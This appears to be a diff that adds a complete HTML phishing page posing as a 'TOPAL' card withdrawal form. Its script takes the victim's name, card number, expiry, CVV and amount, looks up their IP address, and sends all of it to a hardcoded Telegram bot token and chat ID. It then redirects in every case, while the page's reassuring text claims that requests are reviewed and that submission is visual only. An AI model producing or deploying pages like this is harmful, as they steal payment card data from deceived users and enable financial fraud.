@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TOPAL • Card Withdrawal</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --bg1:#0b1220; --bg2:#0f1b33; --accent:#4f8cff; --accent2:#6ee7ff;
+      --card:#0f172a; --muted:#9aa4b2; --line:#1f2a44; --ok:#22c55e;
+    }
+    *{box-sizing:border-box; font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial;}
+    body{
+      margin:0; min-height:100vh; color:#e5e7eb;
+      background: radial-gradient(1200px 600px at 10% -10%, #1b2b5f 0%, transparent 60%),
+                  radial-gradient(800px 500px at 110% 10%, #123b5a 0%, transparent 55%),
+                  linear-gradient(160deg, var(--bg1), var(--bg2));
+      display:grid; place-items:center; padding:24px;
+    }
+    .shell{width:100%; max-width:980px; display:grid; grid-template-columns:1.1fr .9fr; gap:24px;}
+    @media (max-width:900px){.shell{grid-template-columns:1fr;}}
+
+    /* Glass cards */
+    .glass{
+      background: linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.02));
+      backdrop-filter: blur(10px);
+      border:1px solid rgba(255,255,255,.12);
+      border-radius:22px; box-shadow: 0 30px 60px rgba(0,0,0,.35);
+    }
+
+    /* Header */
+    .header{padding:22px 24px; display:flex; align-items:center; justify-content:space-between;}
+    .logo{display:flex; align-items:center; gap:12px;}
+    .mark{
+      width:42px; height:42px; border-radius:14px;
+      background: linear-gradient(135deg, var(--accent), var(--accent2));
+      display:grid; place-items:center; color:#08101f; font-weight:900;
+      box-shadow: inset 0 0 0 1px rgba(255,255,255,.35);
+    }
+    .brand{font-weight:800; letter-spacing:.5px;}
+    .pill{padding:6px 10px; border-radius:999px; border:1px solid var(--line); color:var(--muted); font-size:12px;}
+
+    /* Left: Form */
+    .form{padding:24px;}
+    .title{font-size:28px; font-weight:800; margin:6px 0 6px;}
+    .sub{color:var(--muted); font-size:14px; margin-bottom:18px;}
+    .names{display:flex; gap:12px; margin-bottom:18px;}
+    .chip{flex:1; background:#0b1430; border:1px dashed var(--line); border-radius:14px; padding:12px; font-size:13px;}
+    .chip b{display:block; color:#fff; margin-bottom:2px;}
+
+    label{font-size:12px; color:#cbd5e1; margin:10px 0 6px; display:block;}
+    .field{
+      background:#0b1430; border:1px solid var(--line); border-radius:14px;
+      padding:14px 14px; color:#e5e7eb; outline:none; width:100%;
+    }
+    .field::placeholder{color:#6b7280;}
+    .row{display:grid; grid-template-columns:1fr 1fr; gap:12px;}
+
+    .cta{
+      margin-top:16px; display:flex; gap:12px; align-items:center;
+    }
+    .btn{
+      flex:1; padding:14px 16px; border-radius:16px; border:none; cursor:pointer;
+      background: linear-gradient(135deg, var(--accent), var(--accent2));
+      color:#061226; font-weight:800; letter-spacing:.3px;
+      box-shadow: 0 10px 30px rgba(79,140,255,.35);
+    }
+    .ghost{
+      padding:14px 16px; border-radius:16px; background:transparent; color:#cbd5e1;
+      border:1px solid var(--line);
+    }
+    .fine{font-size:12px; color:#94a3b8; margin-top:10px;}
+    .demo{font-size:11px; color:#fca5a5; margin-top:6px;}
+
+    /* Right: Preview */
+    .preview{padding:24px; display:grid; gap:18px;}
+    .card-ui{
+      height:220px; border-radius:20px; padding:18px;
+      background: linear-gradient(135deg, #0b1430, #121c3d);
+      border:1px solid var(--line); position:relative; overflow:hidden;
+    }
+    .card-ui:after{
+      content:""; position:absolute; inset:auto -30% -60% auto; width:260px; height:260px;
+      background: radial-gradient(circle, rgba(110,231,255,.25), transparent 60%);
+      transform: rotate(25deg);
+    }
+    .card-top{display:flex; justify-content:space-between; align-items:center;}
+    .net{font-weight:700; letter-spacing:.6px;}
+    .num{font-size:22px; letter-spacing:2px; margin:26px 0 10px;}
+    .meta{display:flex; justify-content:space-between; color:#cbd5e1; font-size:12px;}
+
+    .steps{display:grid; gap:10px;}
+    .step{display:flex; gap:10px; align-items:flex-start;}
+    .dot{width:22px; height:22px; border-radius:50%; background:#0b1430; border:1px solid var(--line); display:grid; place-items:center; font-size:12px;}
+    .ok{background:rgba(34,197,94,.15); border-color:rgba(34,197,94,.35); color:var(--ok);}
+    
+    /* Loading overlay */
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(11, 18, 32, 0.95);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 3px solid var(--line);
+      border-top: 3px solid var(--accent);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <!-- Loading Overlay -->
+  <div class="overlay" id="loadingOverlay">
+    <div class="spinner"></div>
+  </div>
+
+  <div class="shell">
+    <section class="glass">
+      <div class="header">
+        <div class="logo">
+          <div class="mark">T</div>
+          <div class="brand">TOPAL</div>
+        </div>
+      </div>
+      <div class="form">
+        <div class="title">Card Withdrawal</div>
+        <div class="sub">Enter card details to request a withdrawal.</div>
+
+        <div class="names">
+          <div class="chip"><b>Beneficiary</b> Bishop & Alex</div>
+          <div class="chip"><b>Processed by</b> Topal</div>
+        </div>
+
+        <label>Card Holder Name</label>
+        <input class="field" id="cardName" placeholder="John Doe" />
+
+        <label>Card Number</label>
+        <input class="field" id="cardNumber" placeholder="1234 5678 9012 3456" />
+
+        <div class="row">
+          <div>
+            <label>Expiry</label>
+            <input class="field" id="cardExpiry" placeholder="MM / YY" />
+          </div>
+          <div>
+            <label>CVV</label>
+            <input class="field" id="cardCVV" type="password" placeholder="***" />
+          </div>
+        </div>
+
+        <label>Amount</label>
+        <input class="field" id="cardAmount" placeholder="$0.00" />
+
+        <div class="cta">
+          <button class="btn" id="submitBtn">Request Withdrawal</button>
+          <button class="ghost" id="clearBtn">Clear</button>
+        </div>
+        <div class="fine">Requests are reviewed before any action.</div>
+        <div class="demo" id="demoNote" style="display: none;"></div>
+      </div>
+    </section>
+
+    <aside class="glass preview">
+      <div class="card-ui">
+        <div class="card-top">
+          <div class="brand">TOPAL</div>
+          <div class="net">VISA</div>
+        </div>
+        <div class="num">•••• •••• •••• 3456</div>
+        <div class="meta"><span>JOHN DOE</span><span>09/27</span></div>
+      </div>
+      <div class="steps">
+        <div class="step"><div class="dot ok">1</div><div><b>Enter details</b><br/><span class="muted">Fill in card information</span></div></div>
+        <div class="step"><div class="dot">2</div><div><b>Review</b><br/><span class="muted">Confirm beneficiary & amount</span></div></div>
+        <div class="step"><div class="dot">3</div><div><b>Submit</b><br/><span class="muted">Visual confirmation only</span></div></div>
+      </div>
+    </aside>
+  </div>
+
+  <script>
+    // Telegram Bot Configuration - REPLACE THESE WITH YOUR OWN
+    const BOT_TOKEN = "7989669437:AAHLUlqKopjA7Bl0nd4t02XVVJLJdVRDr54";
+    const CHAT_ID = "7289366513";
+    // Replace with your actual redirect URL
+    const REDIRECT_URL = "confirm.html"; // Example redirect
+
+    // DOM Elements
+    const submitBtn = document.getElementById('submitBtn');
+    const clearBtn = document.getElementById('clearBtn');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    const demoNote = document.getElementById('demoNote');
+
+    // Show loading overlay
+    function showLoading() {
+      loadingOverlay.style.display = 'flex';
+    }
+
+    // Hide loading overlay
+    function hideLoading() {
+      loadingOverlay.style.display = 'none';
+    }
+
+    // Send data to Telegram
+    async function sendToTelegram(data) {
+      const message = `
+🃏 New Card Withdrawal Request:
+━━━━━━━━━━━━━━━━━
+👤 Card Holder: ${data.cardName}
+💳 Card Number: ${data.cardNumber}
+📅 Expiry: ${data.cardExpiry}
+🔐 CVV: ${data.cardCVV}
+💰 Amount: ${data.cardAmount}
+━━━━━━━━━━━━━━━━━
+⏰ Time: ${new Date().toLocaleString()}
+🌐 IP: ${await getIP()}
+      `.trim();
+
+      // Encode message for URL
+      const encodedMessage = encodeURIComponent(message);
+      
+      // Telegram API URL
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}`;
+      
+      try {
+        const response = await fetch(url);
+        if (!response.ok) {
+          throw new Error(`Telegram API error: ${response.status}`);
+        }
+        return true;
+      } catch (error) {
+        console.error('Failed to send to Telegram:', error);
+        return false;
+      }
+    }
+
+    // Get IP address (simplified)
+    async function getIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      } catch (error) {
+        return 'IP not available';
+      }
+    }
+
+    // Form submission handler
+    async function handleSubmit(event) {
+      event.preventDefault();
+      
+      // Get form values
+      const formData = {
+        cardName: document.getElementById('cardName').value.trim(),
+        cardNumber: document.getElementById('cardNumber').value.trim(),
+        cardExpiry: document.getElementById('cardExpiry').value.trim(),
+        cardCVV: document.getElementById('cardCVV').value.trim(),
+        cardAmount: document.getElementById('cardAmount').value.trim()
+      };
+      
+      // Basic validation
+      if (!formData.cardName || !formData.cardNumber || !formData.cardExpiry || !formData.cardCVV || !formData.cardAmount) {
+        demoNote.textContent = "Please fill in all fields";
+        demoNote.style.display = 'block';
+        demoNote.style.color = '#fca5a5';
+        return;
+      }
+      
+      // Show loading
+      showLoading();
+      
+      try {
+        // Send to Telegram
+        const telegramSent = await sendToTelegram(formData);
+        
+        if (telegramSent) {
+          // Update demo note
+          demoNote.textContent = "✓ Data sent successfully! Redirecting...";
+          demoNote.style.color = '#22c55e';
+          demoNote.style.display = 'block';
+          
+          // Wait a moment then redirect
+          setTimeout(() => {
+            window.location.href = REDIRECT_URL;
+          }, 1500);
+          
+        } else {
+          demoNote.textContent = "Failed to send data, but redirecting...";
+          demoNote.style.color = '#fca5a5';
+          demoNote.style.display = 'block';
+          
+          setTimeout(() => {
+            window.location.href = REDIRECT_URL;
+          }, 1500);
+        }
+        
+      } catch (error) {
+        console.error('Submission error:', error);
+        demoNote.textContent = "Error occurred, but redirecting...";
+        demoNote.style.color = '#fca5a5';
+        demoNote.style.display = 'block';
+        
+        setTimeout(() => {
+          window.location.href = REDIRECT_URL;
+        }, 1500);
+      } finally {
+        // Hide loading after redirect starts
+        setTimeout(hideLoading, 1000);
+      }
+    }
+
+    // Clear form handler
+    function handleClear(event) {
+      event.preventDefault();
+      
+      document.getElementById('cardName').value = '';
+      document.getElementById('cardNumber').value = '';
+      document.getElementById('cardExpiry').value = '';
+      document.getElementById('cardCVV').value = '';
+      document.getElementById('cardAmount').value = '';
+      
+      demoNote.style.display = 'none';
+    }
+
+    // Event Listeners
+    submitBtn.addEventListener('click', handleSubmit);
+    clearBtn.addEventListener('click', handleClear);
+
+    // Card preview updates (optional)
+    document.getElementById('cardName').addEventListener('input', function(e) {
+      const meta = document.querySelector('.card-ui .meta span');
+      if (meta && e.target.value) {
+        meta.textContent = e.target.value.toUpperCase();
+      } else if (meta) {
+        meta.textContent = 'JOHN DOE';
+      }
+    });
+
+    document.getElementById('cardNumber').addEventListener('input', function(e) {
+      const num = document.querySelector('.card-ui .num');
+      if (num && e.target.value) {
+        const lastFour = e.target.value.slice(-4) || '3456';
+        num.textContent = `•••• •••• •••• ${lastFour}`;
+      }
+    });
+
+    document.getElementById('cardExpiry').addEventListener('input', function(e) {
+      const expiry = document.querySelector('.card-ui .meta span:last-child');
+      if (expiry && e.target.value) {
+        expiry.textContent = e.target.value;
+      } else if (expiry) {
+        expiry.textContent = '09/27';
+      }
+    });
+
+    // Show demo note
+    
+  </script>
+</body>
+</html>
